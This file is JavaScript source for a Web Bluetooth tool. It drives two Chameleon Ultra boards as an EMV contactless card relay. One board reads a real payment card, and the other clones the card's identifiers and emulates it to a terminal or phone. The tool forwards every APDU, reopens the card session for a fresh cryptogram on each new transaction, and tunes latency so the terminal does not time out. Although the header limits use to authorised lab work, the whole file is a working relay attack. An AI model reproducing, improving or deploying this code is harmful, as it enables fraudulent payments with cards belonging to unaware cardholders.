/*
 * relay.js -- Web Bluetooth ISO14443-4 (EMV) relay bridge for two Chameleon Ultras.
 *
 * LAB / AUTHORISED-RESEARCH USE ONLY. Relay only cards you own, against
 * terminals you own or are authorised to test.
 *
 * One browser connects to BOTH Ultras over BLE (Nordic UART Service) and
 * bridges APDUs between them -- a direct port of software/script/relay_poc.py,
 * with the TCP hop replaced by two in-browser BLE GATT connections:
 *
 *     [real card] <-RF-> MOLE (board2, reader)  ==BLE==\
 *                                                        >== this browser bridges
 *     [terminal/phone] <-RF-> GHOST (board1, tag) ==BLE=/
 *
 * Requires the relay firmware on both boards (app_version 99.x) and a
 * Web Bluetooth browser (desktop/Android Chrome or Edge; NOT iOS Safari).
 * BLE pairing is disabled on the Ultra by default, so no passkey is needed.
 */
'use strict';

const BUILD = '2026-09-07b adaptive+mtu244';   // shown in the log so you can confirm which version loaded

// --- Nordic UART Service (verified in firmware ble_main.c / ble_nus) ---------
const NUS_SERVICE = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
const NUS_RX      = '6e400002-b5a3-f393-e0a9-e50e24dcca9e'; // write  (host -> device)
const NUS_TX      = '6e400003-b5a3-f393-e0a9-e50e24dcca9e'; // notify (device -> host)

const SOF = 0x11;

// --- command IDs (chameleon_enum.py) -----------------------------------------
const CMD = {
  GET_APP_VERSION: 1000,
  CHANGE_DEVICE_MODE: 1001,
  SET_ACTIVE_SLOT: 1003,
  SET_SLOT_TAG_TYPE: 1004,
  SET_SLOT_ENABLE: 1006,
  GET_GIT_VERSION: 1017,
  HF14A_4_APDU_RECV: 6000,
  HF14A_4_APDU_SEND: 6001,
  HF14A_4_SET_ANTI_COLL: 6002,
  HF14A_4_RELAY_START: 6006,
  HF14A_4_RELAY_APDU: 6007,
  HF14A_4_RELAY_STOP: 6008,
  HF14A_4_SET_LED: 6010,
  HF14A_4_CARD_PROBE: 6011,
};
// status codes: HF_TAG_OK=0, HF_TAG_NO=1, STATUS_SUCCESS=104 (apdu_recv uses SUCCESS)
const ST = { HF_TAG_OK: 0, HF_TAG_NO: 1, SUCCESS: 104 };
const TAG_HF14A_4 = 3000; // TagSpecificType.HF14A_4
const SENSE_HF = 2;       // TagSenseType.HF
// PPSE (SELECT 2PAY.SYS.DDF01) = start of a new phone transaction
const PPSE_HEAD = hexToBytes('00A404000E325041592E5359532E44444630');

// --- byte helpers ------------------------------------------------------------
function u8(arr) { return arr instanceof Uint8Array ? arr : new Uint8Array(arr); }
function concat(...parts) {
  let n = 0; for (const p of parts) n += p.length;
  const out = new Uint8Array(n); let o = 0;
  for (const p of parts) { out.set(p, o); o += p.length; }
  return out;
}
function hex(b) {
  if (!b || !b.length) return '(empty)';
  return Array.from(b, x => x.toString(16).padStart(2, '0')).join(' ').toUpperCase();
}
function hexToBytes(s) {
  s = s.replace(/\s+/g, '');
  const out = new Uint8Array(s.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(s.substr(i * 2, 2), 16);
  return out;
}
function lrc(slice) {
  let r = 0; for (const b of slice) { r = (r + b) & 0xff; }
  return (0x100 - r) & 0xff;
}
function startsWith(a, b) {
  if (a.length < b.length) return false;
  for (let i = 0; i < b.length; i++) if (a[i] !== b[i]) return false;
  return true;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// build a Chameleon command frame (matches make_data_frame_bytes)
function makeFrame(cmd, data, status = 0) {
  data = data || new Uint8Array(0);
  const len = data.length;
  const f = new Uint8Array(9 + len + 1);
  f[0] = SOF;
  f[1] = 0x00;                 // lrc1 slot
  f[2] = (cmd >> 8) & 0xff; f[3] = cmd & 0xff;
  f[4] = (status >> 8) & 0xff; f[5] = status & 0xff;
  f[6] = (len >> 8) & 0xff; f[7] = len & 0xff;
  f[8] = 0x00;                 // lrc2 slot
  f.set(data, 9);
  f[9 + len] = 0x00;           // lrc3 slot
  f[1] = lrc(f.subarray(0, 1));
  f[8] = lrc(f.subarray(0, 8));
  f[9 + len] = lrc(f.subarray(0, 9 + len));
  return f;
}

function parseAntiColl(d) {
  let o = 0;
  const ul = d[o++]; const uid = d.slice(o, o + ul); o += ul;
  const atqa = d.slice(o, o + 2); o += 2;
  const sak = d[o++];
  const al = d[o++]; const ats = d.slice(o, o + al); o += al;
  return { uid, atqa, sak, ats };
}

// --- BLE device wrapper ------------------------------------------------------
class ChameleonBLE {
  constructor(label) {
    this.label = label;
    this.device = null; this.rx = null; this.tx = null;
    this.buf = new Uint8Array(0);
    this.waiters = new Map();   // cmd -> [waiter]
    // Optimistic BLE write chunk. Chrome+nRF52 almost always negotiate an MTU
    // >=185 regardless of link speed, so big frames go in 1-2 writes instead of
    // ~13. Auto-falls back to 20 (today's behaviour) if a device negotiated the
    // 23-byte minimum MTU — see _write.
    this.mtu = 244;
    this.onDisconnect = null;
  }

  get connected() { return !!(this.device && this.device.gatt && this.device.gatt.connected); }

  async connect() {
    this.device = await navigator.bluetooth.requestDevice({
      filters: [{ namePrefix: 'Chameleon' }],
      optionalServices: [NUS_SERVICE],
    });
    this.device.addEventListener('gattserverdisconnected', () => {
      if (this.onDisconnect) this.onDisconnect();
    });
    const server = await this.device.gatt.connect();
    const svc = await server.getPrimaryService(NUS_SERVICE);
    this.rx = await svc.getCharacteristic(NUS_RX);
    this.tx = await svc.getCharacteristic(NUS_TX);
    await this.tx.startNotifications();
    this.tx.addEventListener('characteristicvaluechanged', e => this._onNotify(e.target.value));
    // handshake: prove it speaks our protocol / relay firmware
    const v = await this.sendCmd(CMD.GET_APP_VERSION);
    this.fw = v.data.length >= 2 ? `${v.data[0]}.${v.data[1]}` : '?';
    try {
      const g = await this.sendCmd(CMD.GET_GIT_VERSION);
      this.git = new TextDecoder().decode(g.data);
    } catch (_) { this.git = ''; }
    return this;
  }

  async disconnect() {
    try { if (this.device && this.device.gatt.connected) this.device.gatt.disconnect(); } catch (_) {}
  }

  _onNotify(dv) {
    const chunk = new Uint8Array(dv.buffer, dv.byteOffset, dv.byteLength);
    this.buf = concat(this.buf, chunk);
    this._parse();
  }

  _parse() {
    for (;;) {
      if (this.buf.length < 2) return;
      if (this.buf[0] !== SOF || this.buf[1] !== lrc(this.buf.subarray(0, 1))) {
        this.buf = this.buf.subarray(1); continue;
      }
      if (this.buf.length < 9) return;
      if (this.buf[8] !== lrc(this.buf.subarray(0, 8))) { this.buf = this.buf.subarray(1); continue; }
      const cmd = (this.buf[2] << 8) | this.buf[3];
      const status = (this.buf[4] << 8) | this.buf[5];
      const len = (this.buf[6] << 8) | this.buf[7];
      const total = 9 + len + 1;
      if (this.buf.length < total) return;
      if (this.buf[9 + len] !== lrc(this.buf.subarray(0, 9 + len))) { this.buf = this.buf.subarray(1); continue; }
      const data = this.buf.slice(9, 9 + len);
      this.buf = this.buf.slice(total);
      this._deliver({ cmd, status, data });
    }
  }

  _deliver(resp) {
    const q = this.waiters.get(resp.cmd);
    if (!q) return;
    while (q.length) {
      const w = q.shift();
      if (!w.done) { w.done = true; clearTimeout(w.to); w.resolve(resp); return; }
    }
  }

  sendCmd(cmd, data, timeoutMs = 4000) {
    const frame = makeFrame(cmd, data);
    if (!this.waiters.has(cmd)) this.waiters.set(cmd, []);
    const q = this.waiters.get(cmd);
    const p = new Promise((resolve, reject) => {
      const w = { done: false, resolve, to: null };
      w.to = setTimeout(() => {
        w.done = true;
        const i = q.indexOf(w); if (i >= 0) q.splice(i, 1);
        reject(new Error(`${this.label}: timeout waiting for cmd ${cmd}`));
      }, timeoutMs);
      q.push(w);
    });
    this._write(frame).catch(() => {});
    return p;
  }

  async _write(frame) {
    for (;;) {
      let sent = 0;
      try {
        for (let i = 0; i < frame.length; i += this.mtu) {
          const chunk = frame.subarray(i, Math.min(i + this.mtu, frame.length));
          if (this.rx.writeValueWithoutResponse) await this.rx.writeValueWithoutResponse(chunk);
          else await this.rx.writeValue(chunk);
          sent = i + chunk.length;
        }
        return;
      } catch (e) {
        // Only shrink+retry if NOTHING was sent yet (an oversized first chunk on
        // a tiny-MTU device rejects before transmitting) — so no duplicate/garbled
        // bytes reach the device. A mid-frame failure is not an MTU issue: rethrow.
        if (sent === 0 && this.mtu > 20) { this.mtu = 20; continue; }
        throw e;
      }
    }
  }

  // --- high-level wrappers (mirror chameleon_cmd.py) -------------------------
  changeMode(reader) { return this.sendCmd(CMD.CHANGE_DEVICE_MODE, u8([reader ? 1 : 0])); }
  setActiveSlot(slot) { return this.sendCmd(CMD.SET_ACTIVE_SLOT, u8([slot - 1])); }
  setSlotTagType(slot, t) { return this.sendCmd(CMD.SET_SLOT_TAG_TYPE, u8([slot - 1, (t >> 8) & 0xff, t & 0xff])); }
  setSlotEnable(slot, sense, en) { return this.sendCmd(CMD.SET_SLOT_ENABLE, u8([slot - 1, sense, en ? 1 : 0])); }
  setAntiColl(a) {
    const p = concat(u8([a.uid.length]), a.uid, a.atqa, u8([a.sak]), u8([a.ats.length]), a.ats);
    return this.sendCmd(CMD.HF14A_4_SET_ANTI_COLL, p);
  }
  apduRecv() { return this.sendCmd(CMD.HF14A_4_APDU_RECV, new Uint8Array(0), 2500); }
  apduSend(resp) { return this.sendCmd(CMD.HF14A_4_APDU_SEND, concat(u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp)); }
  async relayStart() {
    const r = await this.sendCmd(CMD.HF14A_4_RELAY_START, new Uint8Array(0), 3500);
    if (r.status === ST.HF_TAG_OK && r.data.length) r.parsed = parseAntiColl(r.data);
    return r;
  }
  relayApdu(apdu) { return this.sendCmd(CMD.HF14A_4_RELAY_APDU, apdu, 3500); }
  relayStop() { return this.sendCmd(CMD.HF14A_4_RELAY_STOP, new Uint8Array(0), 2500); }
  cardProbe(force) { return this.sendCmd(CMD.HF14A_4_CARD_PROBE, u8([force ? 1 : 0]), 2500); }
  setLed(state) { return this.sendCmd(CMD.HF14A_4_SET_LED, u8([state & 0xff])); }
}

// ---------------------------------------------------------------------------
// UI wiring + relay orchestration
// ---------------------------------------------------------------------------
const ghost = new ChameleonBLE('ghost');   // board1, at the terminal/phone
const mole  = new ChameleonBLE('mole');    // board2, at the card
let running = false;
let apduCount = 0;

const $ = id => document.getElementById(id);

function log(msg, cls) {
  const el = $('log');
  const line = document.createElement('div');
  if (cls) line.className = cls;
  const t = new Date().toLocaleTimeString();
  line.textContent = `[${t}] ${msg}`;
  el.appendChild(line);
  el.scrollTop = el.scrollHeight;
}

function setLedUI(who, color) {
  const dot = $(who + '-led');
  if (dot) dot.dataset.color = color;
}

function setDevUI(who, dev) {
  $(who + '-status').textContent = dev.connected ? `connected  fw ${dev.fw}${dev.git ? '  git ' + dev.git : ''}` : 'not connected';
  $(who + '-btn').textContent = dev.connected ? 'Disconnect' : 'Connect';
  $(who + '-card').classList.toggle('on', dev.connected);
  updateStartEnabled();
}

function updateStartEnabled() {
  const ready = ghost.connected && mole.connected && !running;
  $('start').disabled = !ready;
  $('stop').disabled = !running;
}

async function toggleConnect(who) {
  const dev = who === 'ghost' ? ghost : mole;
  if (dev.connected) { await dev.disconnect(); return; }
  try {
    log(`select board for ${who.toUpperCase()} (${who === 'ghost' ? 'terminal/phone side' : 'card side'})…`);
    dev.onDisconnect = () => { log(`${who} disconnected`, 'warn'); setDevUI(who, dev); if (running) stopRelay(); };
    await dev.connect();
    log(`${who.toUpperCase()} connected: fw ${dev.fw} git ${dev.git}`, 'ok');
    if (dev.fw && !dev.fw.startsWith('99')) log(`warning: ${who} fw is ${dev.fw}, expected 99.x relay firmware`, 'warn');
    // Both boards advertise as "ChameleonUltra" and are indistinguishable in the
    // chooser — light a distinct colour so you know which physical unit is which.
    // (Transient identify only; real red/green status takes over once relaying.)
    const idColor = who === 'ghost' ? 3 : 2;       // ghost=RED, mole=BLUE
    try { await dev.setLed(idColor); } catch (_) {}
    setLedUI(who, who === 'ghost' ? 'red' : 'blue');
    log(`${who.toUpperCase()} is the board now showing ${who === 'ghost' ? 'RED' : 'BLUE'} — ` +
        `place the ${who === 'ghost' ? 'RED (ghost) at the terminal/phone' : 'BLUE (mole) at the card'}.`, 'ok');
    setDevUI(who, dev);
  } catch (e) {
    log(`${who} connect failed: ${e.message || e}`, 'err');
  }
}

async function safeProbe(dev) {
  try { const p = await dev.cardProbe(false); return p.status === ST.HF_TAG_OK; }
  catch (_) { return false; }
}

async function armGhost(anti, slot) {
  await ghost.setActiveSlot(slot);
  await ghost.setSlotTagType(slot, TAG_HF14A_4);
  await ghost.setSlotEnable(slot, SENSE_HF, true);
  await ghost.setAntiColl(anti);   // anti-coll BEFORE emulator mode
  await ghost.changeMode(false);   // tag / emulator mode
}
async function armEmulation(anti) { await ghost.setAntiColl(anti); await ghost.changeMode(false); }
async function disarmEmulation() { await ghost.changeMode(true); }

async function cloneFromMole(slot) {
  let warned = false;
  while (running) {
    let p;
    try { p = await mole.cardProbe(true); } catch (_) { await sleep(300); continue; }
    if (p.status === ST.HF_TAG_OK) {
      const r = await mole.relayStart();
      if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) return r.parsed;
    } else {
      mole.setLed(3).catch(() => {}); setLedUI('mole', 'red');
      if (!warned) { log('no card on board2 (mole) — place the card…', 'warn'); warned = true; }
    }
    await sleep(300);
  }
  return null;
}

async function startRelay() {
  if (running) return;
  running = true; apduCount = 0;
  updateStartEnabled();
  const mode = document.querySelector('input[name=mode]:checked').value;
  const gate = (mode === 'B');
  const slot = parseInt($('slot').value, 10) || 1;
  // Adaptive poll: tight while a transaction is live (the phone is WTX-stalled
  // waiting on us, so every ms of poll gap is added latency), relaxed when idle
  // to spare BLE/CPU/battery. Safe on a slow link: the transport is strictly
  // one-command-at-a-time, so the real rate self-caps to the BLE round-trip —
  // this only removes dead time, it can't flood the connection.
  const ACTIVE_POLL = 15, IDLE_POLL = 150, ACTIVE_WINDOW = 2500;
  let lastApduAt = Date.now();
  const pollDelay = () => (Date.now() - lastApduAt < ACTIVE_WINDOW) ? ACTIVE_POLL : IDLE_POLL;
  $('status').textContent = `relaying (Mode ${mode})`;
  log(`=== relay started: Mode ${mode}${gate ? ' (gate-on-card)' : ''}, slot ${slot} ===`, 'ok');

  try {
    // Put the MOLE into reader mode first: this initialises the RC522. Probing
    // the field (card_probe/relay_start) before this faults the board on an
    // uninitialised RC522 and drops BLE (role_mole does set_device_reader_mode).
    await mole.changeMode(true);
    // stale-card fix: force ghost OUT of emulator mode before cloning, else it
    // keeps emulating the previous run's card (slot persists in flash).
    await ghost.changeMode(true);
    ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red');

    const anti = await cloneFromMole(slot);
    if (!anti) { return; }            // stopped while waiting
    log(`cloned card UID=${hex(anti.uid)} ATQA=${hex(anti.atqa)} SAK=${anti.sak.toString(16)} ATS=${hex(anti.ats)}`, 'ok');

    await armGhost(anti, slot);
    let armed = true;
    ghost.setLed(1).catch(() => {}); setLedUI('ghost', 'green'); setLedUI('mole', 'green');
    if (gate) log('MODE B: ghost withholds emulation until board2 has the card.', 'ok');
    log('relay loop running — tap the terminal/phone on board1.', 'ok');

    let lastStat = 0;
    let tPrevDone = performance.now();   // for measuring the wait-gap between APDUs
    while (running) {
      // Mode B, withheld: don't emulate; re-arm the moment the card appears.
      if (gate && !armed) {
        const now = Date.now();
        if (now - lastStat > 500) {
          lastStat = now;
          if (await safeProbe(mole)) {
            await armEmulation(anti); armed = true;
            ghost.setLed(1).catch(() => {}); setLedUI('ghost', 'green'); setLedUI('mole', 'green');
            log('board2 card seated -> emulation ARMED (phone can read)', 'ok');
          } else { ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red'); setLedUI('mole', 'red'); }
        }
        await sleep(pollDelay()); continue;
      }

      let r;
      try { r = await ghost.apduRecv(); } catch (_) { await sleep(pollDelay()); continue; }
      if (r.status !== ST.SUCCESS) {
        const now = Date.now();
        if (now - lastStat > 1000) {
          lastStat = now;
          const present = await safeProbe(mole);
          if (gate && !present) {
            await disarmEmulation(); armed = false;
            ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red'); setLedUI('mole', 'red');
            log('board2 card removed -> emulation WITHHELD (phone sees nothing)', 'warn');
          } else {
            ghost.setLed(present ? 1 : 3).catch(() => {});
            setLedUI('ghost', present ? 'green' : 'red'); setLedUI('mole', present ? 'green' : 'red');
          }
        }
        await sleep(pollDelay()); continue;
      }

      const apdu = r.data;
      const gap = performance.now() - tPrevDone;   // wait since previous APDU finished
      lastApduAt = Date.now();   // activity -> keep polling tight (adaptive window)
      if (startsWith(apdu, PPSE_HEAD)) {
        log('--- new transaction (tap) --- re-opening mole session', 'ok');
        await cloneFromMole(slot);   // re-open the card session for a fresh cryptogram
        apduCount = 0;
      }
      setLedUI('ghost', 'blue'); setLedUI('mole', 'blue');
      const tGot = performance.now();       // apduRecv already returned this APDU
      let rr;
      try { rr = await mole.relayApdu(apdu); }
      catch (_) { rr = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
      const tRelay = performance.now();
      const resp = rr.status === ST.HF_TAG_OK ? rr.data : new Uint8Array(0);
      await ghost.apduSend(resp);
      const tSend = performance.now();
      apduCount++;
      log(`#${apduCount}  ->card ${hex(apdu)}`);
      log(`     card-> ${hex(resp)}  (st=${rr.status})`, resp.length ? '' : 'warn');
      // timing: gap = wait for this APDU (poll+BLE, what adaptive poll targets),
      // relay = mole round-trip (BLE+card), send = apduSend BLE write-back
      log(`     t: gap ${gap.toFixed(0)}ms · relay ${(tRelay - tGot).toFixed(0)}ms · send ${(tSend - tRelay).toFixed(0)}ms`);
      tPrevDone = tSend;
      if (!resp.length) log('empty card response — terminal will likely abort this APDU', 'warn');
      setLedUI('ghost', 'green'); setLedUI('mole', 'green');
    }
  } catch (e) {
    log(`relay error: ${e.message || e}`, 'err');
  } finally {
    try { await mole.relayStop(); } catch (_) {}
    // Release the ghost too, or it's left armed on a solid-red LED: stop
    // emulating (reader mode) and hand the LED back to the default animation,
    // so BOTH boards return to regular on Stop.
    try { await ghost.changeMode(true); } catch (_) {}
    try { await ghost.setLed(0); } catch (_) {}
    setLedUI('ghost', ''); setLedUI('mole', '');
    running = false;
    $('status').textContent = 'stopped';
    log(`=== relay stopped after ${apduCount} APDUs ===`);
    updateStartEnabled();
  }
}

function stopRelay() { running = false; }

window.addEventListener('DOMContentLoaded', () => {
  if (!navigator.bluetooth) {
    log('Web Bluetooth is not available in this browser. Use desktop or Android Chrome/Edge (not iOS Safari).', 'err');
    $('ghost-btn').disabled = true; $('mole-btn').disabled = true;
  }
  $('ghost-btn').onclick = () => toggleConnect('ghost');
  $('mole-btn').onclick = () => toggleConnect('mole');
  $('start').onclick = startRelay;
  $('stop').onclick = stopRelay;
  $('clear').onclick = () => { $('log').innerHTML = ''; };
  setDevUI('ghost', ghost); setDevUI('mole', mole);
  log(`ready (build ${BUILD}). Connect board1 (ghost) and board2 (mole), then Start.`);
});
